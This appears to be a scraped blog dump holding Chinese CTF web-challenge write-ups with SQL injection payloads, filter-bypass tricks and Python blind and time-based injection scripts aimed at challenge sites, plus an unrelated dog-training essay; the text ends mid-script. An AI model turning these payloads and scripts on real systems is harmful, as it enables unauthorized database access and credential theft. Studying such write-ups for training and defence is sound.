'http://username:password@hostname/path?arg=value#anchor';\n\n这样的方式也可以解析url，所以构造\n\n```\nhttp://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@ip_addr/plz%1agive%1ame\n```\n\n注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：）\n\n# Replace filter\n\n关键代码如下\n\n```php\nif(isset($_GET['say']) && strlen($_GET['say']) < 20){\n\n    $say = preg_replace('/^(.*)flag(.*)$/', '${1}<!-- filtered -->${2}', $_GET['say']);\n\n    if(preg_match('/give_me_the_flag/', $say)){\n        echo $flag;\n    }else{\n        echo 'What the f**k?';\n    }\n}\n```\n\n这里看学长的博客get到了新姿势，这个题目绕过的点在 `.*` 这里，这个可以匹配任意字符，但是不可以匹配换行，而 `^$` 又限制了字符串必须在同一行，所以绕过就简单了，payload\n\n```\nhttp://replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag\n```\n\n# Hell JS\n\n# Anti SQLi\n\n关键过滤如下\n\n```php\n preg_match(\n            '/\\.|\\`|\"|\\'|\\\\|\\xA0|\\x0B|0x0C|\\t|\\r|\\n|\\0|'.\n            '=|<|>|\\(|\\)|@@|\\|\\||&&|#|\\/\\*.*\\*\\/|--[\\s\\xA0]|'.\n            '0x[0-9a-f]+|0b[01]+|x\\'[0-9a-f]+\\'|b\\'[01]+\\'|'.\n            '[\\s\\xA0\\'\"]+(as|or|and|r*like|regexp)[\\s\\xA0\\'\"]+|'.\n            'union[\\s\\xA0]+select|[\\s\\xA0](where|having)|'.\n            '[\\s\\xA0](group|order)[\\s\\xA0]+by|limit[\\s\\xA0]+\\d|'.\n            'information_schema|procedure\\s+analyse\\s*/is',\n            $id.','.$pw\n        ) and die('Hack detected');\n```\nsql语句即判断条件\n```php\n$result = mysqli_fetch_array(\n            mysqli_query(\n                $con, \n                \"SELECT * FROM `antisqli` WHERE `id`='{$id}' AND `pw`=md5('{$pw}');\"\n            )\n        );\n        mysqli_close($con);\n\n        if(isset($result)){\n            if($result['no'] === '31337'){\n                echo $flag;\n            }else{\n                echo 'Hello, ', $result['id'];\n            }\n        }else{\n            echo 'Login failed';\n        }\n```\n\n该正则匹配中 `|\\\\|` 是无法匹配到 `\\` 的，必须要用四个才可以，所以这道题目中 \\\\ 是可以用的，用 `id=\\` 可以成功吃掉一个引号。\n正则中 `union[\\s\\xA0]+select` 还可考虑用 `union all select` 绕过，正则 `--[\\s\\xA0]` ，其中查资料发现\n\n> \\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v]\n\n也就是说还有其它字符可以匹配，例如 `%01,%11,%02` ，基于以上内容可以构造payload\n\n```\n?id=1\\&pw=union all select 1222,212,12 from antisqli--%10\n```\n\n最终payload\n\n```\n?id=1\\&pw=union all select 31337,2,3 from antisqli--%10\n```\n\n# Name Check\n\n关键过滤如下\n\n```php\nif(preg_match(\"/admin|--|;|\\(\\)|\\/\\*|\\\\0/i\", $name))\n```\n\n```php\n$res = $sql->query(\"\n            SELECT \n            MAX('0','1','{$name}') LIKE 'a%', \n            INSTR('{$name}','d')>0, \n            MIN('{$name}','b','c') LIKE '__m__', \n            SUBSTR('{$name}',-2)='in'\n        ;\");\n        if($res === false){\n            echo 'Database error';\n            goto quit;\n        }\n        $row = $res->fetchArray(SQLITE3_NUM);\n        if(\n            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||\n            array_sum($row) !== 4 \n        ){\n            echo 'Auth failed';\n            goto quit;\n        }\n        echo $flag;\n```\n\n看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 `||` 而不是 `+` ，所以payload： `?name=ad'||'min` \n\n# I am slowly\n\n```php\n    if(isset($answer)){\n        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)\n            or die('SQL server down');\n\n        $result = mysqli_fetch_array(\n            mysqli_query($con, \"SELECT `count` FROM `{$table}`;\")\n        );\n        if(!isset($result)){\n            mysqli_query($con, \"CREATE TABLE IF NOT EXISTS `{$table}` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);\");\n            $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand()));\n            mysqli_query($con, \"INSERT INTO `{$table}` (`answer`,`count`) VALUES ('{$new_answer}',1);\");\n\n        }elseif($result['count'] === '12'){\n            mysqli_query($con, \"DROP TABLE `{$table}`;\");\n            echo 'Game over';\n            goto quit;\n        }\n        $randtime = mt_rand(1, 10);\n        $result = mysqli_fetch_array(\n            mysqli_query($con, \"SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';\")\n        );\n        if(isset($result) && $result['answer'] === $answer){\n            mysqli_query($con, \"DROP TABLE `{$table}`;\");\n            echo $flag;\n        }else{\n            mysqli_query($con, \"UPDATE `{$table}` SET `count`=`count`+1;\");\n            echo 'Go fast';\n        }\n```\n\n代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是：\n\n> 判断count的值-->执行SQL语句-->加count值\n\n按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 `执行SQL语句` 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer\n\n```python\nimport requests\n\nkeys = '0123456789abcdef'\nheader = {\n\"Host\":\"iamslowly.thinkout.rf.gd\",\n\"Cache-Control\":\"max-age=0\",\n\"Upgrade-Insecure-Requests\":\"1\",\n\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\",\n\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\",\n\"Referer\":\"http://solveme.peng.kr/chall\",\n\"Accept-Language\":\"zh-CN,zh;q=0.8\",\n\"Cookie\":\"__test=8f5247d83ccd8573674837d6f9a37fd1\"\n}\npayload = '440763269e2fe7a672a52ea827728'\nfor i in range(30):\n    for j in keys:\n        url = \"http://iamslowly.thinkout.rf.gd/?i=1&answer=' or if((answer like '{}%'),sleep(50),2)%23\".format(payload + j)\n        try:\n            content = requests.get(url,headers=header,timeout=30).content\n            print(content[:10])\n        except:\n            payload += j\n            print(payload)\n            break\n```\n\n这题目盲注时间有点长，这里贴一下结果 `440763269e2fe7a672a52ea827728539` 。\n\n# Check via eval\n\n主要代码如下\n\n```php\n    $exam = 'return\\''.sha1(time()).'\\';';\n\n    if (!isset($_GET['flag'])) {\n        echo '<a href=\"./?flag='.$exam.'\">Click here</a>';\n    }\n    else if (strlen($_GET['flag']) != strlen($exam)) {\n        echo 'Not allowed length';\n    }\n    else if (preg_match('/`|\"|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {\n        echo 'Not allowed keyword';\n    }\n    else if (eval($_GET['flag']) === sha1($flag)) {\n        echo $flag;\n    }\n```\n\n题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 `eval($_GET['flag'])` 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 [Click Here](http://php.net/manual/zh/language.basic-syntax.phpmode.php) ，也就是说可以用 `<?= expression?>` 来达到绕过 `echo` 过滤的目的。\n\n我们可以构造 `<?= flag?>` 来输出flag，尝试构造payload\n\n```\n$a='alag';$a{0}='f';?>11111111111111111;<?=$$a;?>\n```","tags":["CTF"],"categories":["writeup"]},{"title":"萌宠养成记","url":"/2018/07/24/Train-my-pet/","content":"\n**前言**\n\n最近暑假闲着无聊，决定继续开发一下我弟（点点）的其它技能，目前已经会坐、立、卧下、握手、定等动作，我娘老是说这些都太小儿科了，要我再教几个花哨的，我看着我们家点点一天到晚到处瞎逛，而且还变胖了o(╯□╰)o，于是决定操作起来\n\n<!--more-->\n\n# 小技巧\n\n在对宠物进行训练时，这些东东要注意一下：）\n\n- 每次训练时间不要太长，最多半个小时，如果想要加强效果可以多次，但是每次都不要太长，还有尽量要在它训练状态很好的时候结束，这样能够给它正向激励，让它喜欢上训练，最好在每次训练结束给它一些奖励，比如额外的食物啦，或者是陪它玩一玩等\n\n- 喂食频率切勿太低，如果有的人在刚开始的时候它如果不做对就不给奖励，这样的话它的积极性会降低，会对训练产生压力感，我们应该是在它只要使做正确就给它奖励，一般一分钟15次左右，这样能够使宠物保持亢奋。\n\n- 给与奖励时一定要即时，准确，否则的话它无法准确理解究竟它的哪个动作是正确的，增加了训练难度。\n\n- 切勿打骂，操之过急，这些会破坏你们之间的关系，也会使它对训练产生抵触情绪，无法通过训练加深我们和宠物之间的信任。\n\n# 匍匐前进\n\n今天决定教它匍匐前进，这个动作建立在它会卧下的基础上，当它会卧下之后，先命令它卧下，然后再压着它身子（避免他起身）让它往前走，同时口中重复口令“匍匐前进”，开始只要他往前走了就给他奖励，让它知道你是想让它往前走，之后可以逐渐延长距离，知道它完全理解你的意图，之后可以开始放开压着它的手，重新开始慢慢延长距离，如果它站起来走，就给予警告，直到慢慢可以完全做正确。期间一定要多重复口令，保证最后可以仅靠口令也使他能够理解匍匐前进的动作要领。\n\n![匍匐前进](Train-my-pet/1.gif)\n\n# 装死\n\n这个动作的前提需要狗狗需要会坐下和卧下，我们先让它卧下，然后用食物由它的嘴边向它的耳朵方向慢慢旋转，它会因为要够这个食物身体侧身从而倒下来，这样就达到了装死的动作效果， 如果无法倒下可以自由调整角度或者对它进行一定的帮助，一旦做对给予奖励，重复多次，直到它不需要你诱导它也可以躺下为止，之后就是让它形成连贯动作，同时重复口令或手势，使它建立联系，一旦躺下去，没有口令不能够起来，可以慢慢延长持续时间，\n\nPS：这个动作还要建立一个让它“复活”的信号，也就是装死结束的信号，可以是一句口哨，也可以是其它，这个还是很简单的。\n\n![装死](Train-my-pet/3.gif)\n\n# 翻滚\n\n\n\n![翻滚](Train-my-pet/4.gif)\n\n# 跳跃\n\n![跳跃](Train-my-pet/2.gif)\n\n![跳跃](Train-my-pet/5.gif)\n\n再见，恭喜，击掌，转圈要注意训练完成之后手里不拿东西\n\n","tags":["Essay"],"categories":["随笔"]},{"title":"实验吧web","url":"/2018/06/10/实验吧web/","content":"\n# 前言\n\n最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目\n\n<!--more-->\n\n# 后台登录\n\n打开网页后查看元素发现sql逻辑语句\n\n```\n$sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n```\n\n这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 `' or 'a` 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 `ffifdyop` ,直接提交一下这个东西，居然正好就是可以。\n\n# 加了料的报错注入\n\n本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。\n\n```python\nimport string\nimport requests\n\n\nkeys = string.ascii_lowercase + r'!_{}@~,' + string.digits\nflag = ''\nflag_yes = 'You are our member'\nurl = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'\npayload = \"' or (select group_concat(column_name) from information_schema.tables where !(table_schema <> database())) regexp '^{}' and 2>'1\"\ndata = {'username':'aa','password':payload}\n\nfor i in range(15):\n\tfor item in keys:\n\t\ttmp = item\n\t\tdata['password'] = payload.format(flag + tmp)\n\t\tres = requests.post(url,data=data).text\n\t\tif flag_yes in res:\n\t\t\tflag += tmp\n\t\t\tprint(flag)\n\t\t\tbreak\n\tprint(i)\n\nprint('database:',flag)\n```\n\n# 认真一点！\n\n这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了\n\n直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现\n`and,空格，^,union,substr,逗号,%`等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合`id=0'%0aoorr%0a'or'='*`，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/\\*\\*/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注，\n\n```python\nimport string\nimport requests\nfrom urllib import parse\n\nkeys = string.ascii_lowercase + string.digits + r'!_{}@~.'\nflag = ''\nflag_yes = 'You are in'\nurl = r'http://ctf5.shiyanbar.com/web/earnest/index.php'\npayload = \"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a\" + \"'{}$')\" + \"%0aoorr%0a'b'='a\"\n\ndef blind_inje(payload):\n\tflag = ''\n\tdata = {'id':payload}\n\tok = True\n\twhile ok:\n\t\tfor item in keys:\n\t\t\tdata['id'] = parse.unquote(payload.format(item + flag))\n\t\t\tres = requests.post(url,data=data).text\n\t\t\t# print(payload.format(item + flag))\n\t\t\tif flag_yes in res:\n\t\t\t\tflag = item + flag\n\t\t\t\tprint(flag)\n\t\t\t\tbreak\n\t\t\tif item == '.':\n\t\t\t\tok = False\n\tprint('[+]:',flag)\n# blind_inje(payload)\n# table_name:fiag@users\n\n# payload1 = \"0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a\" + \"'{}$')\" + \"%0aoorr%0a'b'='a\"\n# blind_inje(payload1)\n# column_name:fl.4g或者fl$4g\n\npayload2 = \"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'{}$')%0aoorr%0a'b'='a\"\nblind_inje(payload2)\n\n# flag:flag{haha~you.win!}注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次\n# flag:flag{haha~you win!}\n```\n\n# NSCTF web200\n\n题目给出了加密代码，直接逆向跑一遍就好了\n\n```php\n<?php  \n$str = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';\n$str = base64_decode(strrev(str_rot13($str)));\n$flag = '';\nfor($i=0;$i<strlen($str);$i++){\n\t$_c = substr($str, $i, 1);\n\t$a = ord($_c);\n\t$b = chr($a-1);\n\t$flag = $flag.$b;\n}\necho strrev($flag);\n?>\n```\n\n# 登录一下好吗\n\n先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 `uesrname=admin' or 1=1`,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload\n\n```\nusername='='&password='='\n```\n\n那么在数据库中就变成了 `select * from users where username=''='' and password=''=''` ，所以就成了`select * from users where 1 and 1` 注意他逻辑运算的时候是一次从前往后运算的。\n\n# 天下武功唯快不破\n\n看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本\n\n```python\nimport requests\nimport base64\n\nurl = 'http://ctf5.shiyanbar.com/web/10/10.php'\n\nresponse = requests.get(url).headers['FLAG']\n\nflag = base64.b64decode(response)\n\nflag = flag.decode('utf-8')\nflag = flag.split(':')\nflag = flag[1]\n\ndata = {'key':flag}\n\nres = requests.post(url,data=data).text\n\nprint(res)\n```\n\n可以得到flag\n\n# 让我进去\n\n修改cookie里的source的值为1可以看到源代码\n\n```php\n$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";\n$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!\n$username = $_POST[\"username\"];\n$password = $_POST[\"password\"];\nif (!empty($_COOKIE[\"getmein\"])) {\n    if (urldecode($username) === \"admin\" && urldecode($password) != \"admin\") {\n        if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) {\n            echo \"Congratulations! You are a registered user.\\n\";\n            die (\"The flag is \". $flag);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"You are not an admin! LEAVE.\");\n    }\n}\nsetcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));\nif (empty($_COOKIE[\"source\"])) {\n    setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));\n}\nelse {\n    if ($_COOKIE[\"source\"] != 0) {\n        echo \"\"; // This source code is outputted here\n    }\n}   \n```\n\n代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的\n\n![payload](实验吧web/1.png)\n\n# 简单的SQL注入3\n\n题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本\n\n```python\nimport requests\nimport string\n\nurl = 'http://ctf5.shiyanbar.com/web/index_3.php'\npayload = \"?id=0' or (substr(database(),{},1)='{}')%23\"  # database:web1\nwords = string.ascii_lowercase + string.digits + '{}_!~@%^&*-'\nflag_yes = 'Hello'\nflag = ''\npayload1 = \"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),{},1)='{}')%23\"\n# table_name: flag@web1\npayload2 = \"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),{},1)='{}')%23\"\n# column_name = flag@id\npayload3 = \"?id=0' or (substr((select group_concat(flag separator '@') from flag),{},1)='{}')%23\"\nfor i in range(8,30):\n\tfor item in words:\n\t\tres = requests.get(url + payload3.format(str(i),item)).text\n\t\tif flag_yes in res:\n\t\t\tflag += item\n\t\t\tprint(flag)\n\t\t\tbreak\n\t\tif item == '-':\n\t\t\tprint('end')\n# flag{y0u_@r3_5o_damn_90od} 大小写可能有问题\n```\n\n本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。\n\n# 简单的SQL注入\n\n线简单测试一下 `id=1'` 页面回显报错，尝试报错注入，可以得到数据库名为 `web1` ，在尝试一下过滤了那些字符没回发现过滤了许多字符 `from ` , `where ` ,\n`group_concat` , `order ` , `union ` ，这里有许多字符过滤时另加了一个空格，很恶心。\n\n最后用报错注入老是有问题，后来决定换union试一下\n\n```\n?id=0' uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere table_sctable_schemahema='web1\n```\n\n可知表名`flag,web_1` ,\n\n```\n?id=0' uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere table_name='flag\n```\n\n结果返回权限不够\n\n> SELECT command denied to user 'web1'@'localhost' for table 'columns'\n\n又看到题目说获取flag值，猜测列名应该是flag，\n\n最终payload\n\n```\n?id=0' uunion nion selselect ect flag frfrom om flag whwhere ere 'a'='a\n```\n\n# 简单的SQL注入2\n\n```\n?id=1'%23\n```\n\n可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/\\*\\*/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号\n\n```\n?id=-1'/**/union/**/select/**/table_name/**/from/**/information_schema.tables%23\n?id=-1'/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='flag'%23\n?id=-1'/**/union/**/select/**/flag/**/from/**/flag%23\n```\n\n# 这个看起来有点简单\n\n很常规的一套操作\n\n```\nhttp://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\n后面的省略\n\n# 因缺思汀的绕过\n\n查看元素即可得到源码，这是基础，源码位置在 `source.txt` 。\n\n```php\n\nfunction AttackFilter($StrKey,$StrValue,$ArrReq){  \n    if (is_array($StrValue)){\n        $StrValue=implode($StrValue);\n    }\n    if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){   \n        print \"姘村彲杞借垷锛屼害鍙禌鑹囷紒\";\n        exit();\n    }\n}\n\n$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";\nforeach($_POST as $key=>$value){ \n    AttackFilter($key,$value,$filter);\n}\n\n$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");\nif (!$con){\n\tdie('Could not connect: ' . mysql_error());\n}\n$db=\"XXXXXX\";\nmysql_select_db($db, $con);\n$sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\";\n$query = mysql_query($sql); \nif (mysql_num_rows($query) == 1) { \n    $key = mysql_fetch_array($query);\n    if($key['pwd'] == $_POST['pwd']) {\n        print \"CTF{XXXXXX}\";\n    }else{\n        print \"浜﹀彲璧涜墖锛�\";\n    }\n}else{\n\tprint \"涓€棰楄禌鑹囷紒\";\n}\nmysql_close($con);\n?>\n```\n\n关键代码如下：\n\n```\n$sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\";\n$query = mysql_query($sql); \nif (mysql_num_rows($query) == 1) { \n    $key = mysql_fetch_array($query);\n    if($key['pwd'] == $_POST['pwd']) {\n        print \"CTF{XXXXXX}\";\n    }else{\n        print \"浜﹀彲璧涜墖锛�\";\n    }\n}\n```\n\n第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如：\n\n```\nselect * from users where username='' or 1=1 limit 1 offset 0\n```\n\n但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了\n\n```\nuname=uname=' or 1=1 group by pwd with rollup limit 1 offset 2#&pwd=\n```\n\n这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。\n\n注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值\n\n> Variable_name | Value\nsql_mode       | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER\n\n默认会设置有 <font face=\"futura\">ONLY_FULL_GROUP_BY</font>这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令\n\n```\nset GLOBAL sql_mode='TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER'\n```\n\n如此即可以在自己的数据库上实现相同的效果。\n\n# 天网管理系统\n\n查看元素，发现语句\n\n```\n$test=$_GET['username']; $test=md5($test); if($test=='0') \n```\n\n可知是利用md5弱比较，\n\n故提交username为 `s878926199a` ,即可得到下一个页面地址，得到如下语句\n\n```\n$unserialize_str = $_POST['password']; \n$data_unserialize = unserialize($unserialize_str); \nif($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???') { \n\tprint_r($flag); \n} \n伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年\n```\n\n看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333）\n\n```\n$a['user'] = true;\n$a['pass'] = true;\n$b = serialize($a);\nprint($b);\n```\n\n提交就可以了。\n\n# 拐弯抹角\n\n代码审计，就是绕过的题目的过来吧就好了\n\n```\nhttp://ctf5.shiyanbar.com/indirection\\index.php/index.php\n```\n\n关键点就是还是利用\\来替换/，尽管题目限制了\\，但是在此处并没有受到限制\n\n# Forms\n\n查看元素，发现一段代码\n\n```\n<input name=\"showsource\" value=\"0\" type=\"hidden\">\n```\n\n直接修改值为1即可查看源代码，然后一波简单操作就得到flag\n\n# 忘记密码了\n\n先随便输入个邮箱之后页面会返回跳转链接 `step2.php?email=youmail@mail.com&check=???????` ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点\n\n```\n<form action=\"submit.php\" method=\"GET\">\n\t\t<h1>æ¾åå¯ç step2</h1>\n\t\temail:<input name=\"emailAddress\" type=\"text\" <br />\n\t\tvalue=\"youmail@mail.com\"  disable=\"true\"/></br>\n\t\ttoken:<input name=\"token\" type=\"text\" /></br>\n\t\t<input type=\"submit\" value=\"æäº¤\">\n</form>\n```\n\n访问submit.php页面，提示不是admin，在查看抓包内容\n\n```\n<meta name=\"admin\" content=\"admin@simplexue.com\" />\n<meta name=\"editor\" content=\"Vim\" />\n```\n\n发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下\n\n```php\nif(strlen($token)!=10) die('fail');\nif($token!='0') die('fail');\n```\n\n这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 `content=\"admin@simplexue.com\"` 猜测可能就是admin邮箱，提交一下果然可以\n\n```\nhttp://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&token=0e00000000\n```\n\n# once more\n\n很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码\n\n```\n1e8%00*-*\n```\n\n# Guess next session\n\n```\n<?php\nsession_start(); \nif (isset ($_GET['password'])) {\n    if ($_GET['password'] == $_SESSION['password'])\n        die ('Flag: '.$flag);\n    else\n        print '<p>Wrong guess.</p>';\n}\n\nmt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));\n?>\n```\n\n题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 `$_SESSION['password']` 为空，那么我们提交一个空的密码那么在验证时就会有 `''==''` 为true，即可验证通过\n\n\n# FALSE\n\n```php\n<?php\nif (isset($_GET['name']) and isset($_GET['password'])) {\n    if ($_GET['name'] == $_GET['password'])\n        echo '<p>Your password can not be your name!</p>';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('Flag: '.$flag);\n    else\n        echo '<p>Invalid password.</p>';\n}\nelse{\n\techo '<p>Login first!</p>';\n}\n?>\n```\n\nsha1数组绕过即可\n\n```\n?name[]=2&password[]=1\n```\n\n# 程序逻辑问题\n\n查看元素可以看到有个 `index.txt` ，访问以下得到源码，这里只给出部分\n\n```php\nif($_POST[user] && $_POST[pass]) {\n\t$conn = mysql_connect(\"********\", \"*****\", \"********\");\n\tmysql_select_db(\"phpformysql\") or die(\"Could not select database\");\n\tif ($conn->connect_error) {\n\t\tdie(\"Connection failed: \" . mysql_error($conn));\n} \n$user = $_POST[user];\n$pass = md5($_POST[pass]);\n\n$sql = \"select pw from php where user='$user'\";\n$query = mysql_query($sql);\nif (!$query) {\n\tprintf(\"Error: %s\\n\", mysql_error($conn));\n\texit();\n}\n$row = mysql_fetch_array($query, MYSQL_ASSOC);\n//echo $row[\"pw\"];\n  \n  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {\n\techo \"<p>Logged in! Key:************** </p>\";\n}\n```\n\n分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交\n\n```\n' and 0=1 union select 'c4ca4238a0b923820dcc509a6f75849b'#\n```\n\n那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload\n\n```\nuser=' and 0=1 union select 'c4ca4238a0b923820dcc509a6f75849b'#&pass=1\n```\n\n# PHP大法\n\nurl二次编码绕过\n\n```\n?id=%2568%2561%2563%256b%2565%2572%2544%254a\n```\n\n# 貌似有点难\n\n简单的x-forwarded-for修改即可\n\n# 看起来有点难\n\n先是随便在admin字段尝试（因为admin字段有回显），当输入 `admin' and 1=1#` 时返回“登录失败，错误的用户名和密码”，而如果输入 `admin' and 1=2#` 时，则返回“数据库连接错误”！！，所以这儿是一处注入点\n\n判断数据库长度 `admin' and length(database())=4#` 可知数据库长度为4，接下来爆库名 `?admin=admin' and substr(database(),1,3)='tes'%23&pass=12456&action=login` ,数据库名是 `test` \n\n盲注脚本\n\n```python\nimport requests\n\nurl = \"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and \"\ndic = ',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'\n# payload = \"substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}'%23&pass=12456&action=login\"\nyes = '错误'\nlength = 1\ntable_name = ''  # admin\ncolumn_name = '' # username,password\n# payload = \"substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),{},1)='{}'%23&pass=12456&action=login\"\npayload = \"substr((Select group_concat(username,password) from admin),{},1)='{}'%23&pass=12456&action=login\"\nwhile(True):\n\tfor i in dic:\n\t\tres = 